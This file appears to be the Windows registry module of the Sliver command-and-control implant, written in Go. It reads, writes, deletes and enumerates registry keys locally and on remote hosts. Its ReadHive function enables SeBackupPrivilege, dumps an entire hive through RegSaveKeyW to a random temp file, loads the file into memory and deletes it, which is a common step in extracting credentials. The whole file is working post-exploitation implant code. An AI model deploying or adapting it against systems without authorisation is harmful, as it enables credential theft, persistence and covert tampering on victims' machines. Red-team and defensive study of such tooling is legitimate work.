package registry

import (
	"errors"
	"fmt"
	"math/rand"
	"os"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"strings"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var hives = map[string]registry.Key{
	"HKCR": registry.CLASSES_ROOT,
	"HKCU": registry.CURRENT_USER,
	"HKLM": registry.LOCAL_MACHINE,
	"HKPD": registry.PERFORMANCE_DATA,
	"HKU":  registry.USERS,
	"HKCC": registry.CURRENT_CONFIG,
}

func openKey(hostname string, hive string, path string, access uint32) (*registry.Key, error) {
	var (
		key registry.Key
		err error
	)
	hiveKey, found := hives[hive]
	if !found {
		return nil, fmt.Errorf("could not find hive %s", hive)
	}
	localKey, err := registry.OpenKey(hiveKey, path, access)
	if hostname != "" {
		remKey, err := registry.OpenRemoteKey(hostname, hiveKey)
		if err != nil {
			return nil, err
		}
		key, err = registry.OpenKey(remKey, path, access)
	} else {
		key = localKey
	}
	if err != nil {
		return nil, err
	}
	return &key, nil
}

// ReadKey reads a registry key value and returns it as a string
func ReadKey(hostname string, hive string, path string, key string) (string, error) {
	var (
		buf    []byte
		result string
	)

	k, err := openKey(hostname, hive, path, registry.QUERY_VALUE)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("could not open key %s: %s\n", path, err.Error())
		// {{end}}
		return "", err
	}

	_, valType, err := k.GetValue(key, buf)
	if err != nil {
		return "", err
	}
	switch valType {
	case registry.BINARY:
		val, _, err := k.GetBinaryValue(key)
		if err != nil {
			return "", err
		}
		result = fmt.Sprintf("%v", val)
	case registry.SZ:
		fallthrough
	case registry.EXPAND_SZ:
		val, _, err := k.GetStringValue(key)
		if err != nil {
			return "", err
		}
		result = val
	case registry.DWORD:
		fallthrough
	case registry.QWORD:
		val, _, err := k.GetIntegerValue(key)
		if err != nil {
			return "", err
		}
		result = fmt.Sprintf("0x%08x", val)
	case registry.MULTI_SZ:
		val, _, err := k.GetStringsValue(key)
		if err != nil {
			return "", err
		}
		result = strings.Join(val, "\n")
	default:
		return "", fmt.Errorf("unhandled type: %d", valType)
	}
	return result, nil
}

// WriteKey writes a value to an existing key.
// If the key does not exists, it gets created.
// If the key exists and the new type is different than the existing one,
// the new type overrides the old one.
func WriteKey(hostname string, hive string, path string, key string, value interface{}) error {
	k, err := openKey(hostname, hive, path, registry.QUERY_VALUE|registry.SET_VALUE|registry.WRITE)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("could not open key %s: %s\n", path, err.Error())
		// {{end}}
		return err
	}

	switch v := value.(type) {
	case uint32:
		err = k.SetDWordValue(key, v)
	case uint64:
		err = k.SetQWordValue(key, v)
	case string:
		err = k.SetStringValue(key, v)
	case []byte:
		err = k.SetBinaryValue(key, v)
	default:
		return fmt.Errorf("unknow type")
	}

	return err
}

// DeleteKey removes an existing key or value.
// Removing a value takes precident over removing a key.
// If neither exists, an error is returned.
func DeleteKey(hostname string, hive string, path string, key string) error {
	k, err := openKey(hostname, hive, path, registry.SET_VALUE)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("could not open key %s: %s\n", path, err.Error())
		// {{end}}
		return err
	}

	err = k.DeleteValue(key)
	if err != nil {
		err = registry.DeleteKey(*k, key)
	}

	return err
}

// ListSubKeys returns all the subkeys for the provided path
func ListSubKeys(hostname string, hive string, path string) (results []string, err error) {
	k, err := openKey(hostname, hive, path, registry.READ|registry.RESOURCE_LIST|registry.FULL_RESOURCE_DESCRIPTOR)
	if err != nil {
		return
	}
	kInfo, err := k.Stat()
	if err != nil {
		return
	}
	return k.ReadSubKeyNames(int(kInfo.SubKeyCount))
}

// ListValues returns all the value names for a subkey path
func ListValues(hostname string, hive string, path string) (results []string, err error) {
	k, err := openKey(hostname, hive, path, registry.READ|registry.RESOURCE_LIST|registry.FULL_RESOURCE_DESCRIPTOR)
	if err != nil {
		return
	}
	kInfo, err := k.Stat()
	if err != nil {
		return
	}
	return k.ReadValueNames(int(kInfo.ValueCount))
}

// CreateSubKey creates a new subkey
func CreateSubKey(hostname string, hive string, path string, keyName string) error {
	k, err := openKey(hostname, hive, path, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	_, _, err = registry.CreateKey(*k, keyName, registry.ALL_ACCESS)
	return err
}

func generateTempFileName() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	randomBytes := make([]byte, 8)
	for i := range randomBytes {
		randomBytes[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomBytes) + ".tmp"
}

// ReadHive dumps the content of a registry hive into a single binary blob
func ReadHive(requestedRootHive string, requestedHive string) ([]byte, error) {
	// In order to dump a hive, we need the SeBackupPrivilege privilege
	err := priv.SePrivEnable("SeBackupPrivilege")
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("SePrivEnable failed:", err)
		// {{end}}
		return nil, err
	}

	/*
		Create a random file name to output the hive to.
		The system call to dump registry information (RegSaveKeyW)
		only accepts a file name as an output location, as opposed to a
		buffer. So we will output the result of the system call, read the
		resulting file into memory, then delete the file.
	*/

	/*
		We have to make sure the file we ask RegSaveKeyW to output does not exist
		because if it does, the call will fail.
		Keep generating and checking file names until we find one that does not exist.
	*/
	var tempFileName string
	for {
		tempFileName = fmt.Sprintf("%s\\%s", os.TempDir(), generateTempFileName())
		if _, err := os.Stat(tempFileName); errors.Is(err, os.ErrNotExist) {
			// {{if .Config.Debug}}
			log.Printf("Going to output hive data to %s", tempFileName)
			// {{end}}
			break
		}
	}
	tempFileNamePtr, err := windows.UTF16PtrFromString(tempFileName)
	if err != nil {
		return nil, err
	}

	hiveHandle, err := openKey("", requestedRootHive, requestedHive, registry.READ)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Could not open %s\\%s: %v", requestedRootHive, requestedHive, err)
		// {{end}}
		return nil, err
	}
	defer hiveHandle.Close()

	err = syscalls.RegSaveKeyW(windows.Handle(*hiveHandle), tempFileNamePtr, nil)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Could not save %s\\%s to %s: %v", requestedRootHive, requestedHive, tempFileName, err)
		// {{end}}
		return nil, err
	}

	data, err := os.ReadFile(tempFileName)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Could not open temp file: %v", err)
		// {{end}}
		return nil, err
	}
	err = os.Remove(tempFileName)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Could not delete temp file: %v", err)
		// {{end}}
		// No reason to throw away the data if we cannot delete the file
		return data, err
	}

	return data, nil
}
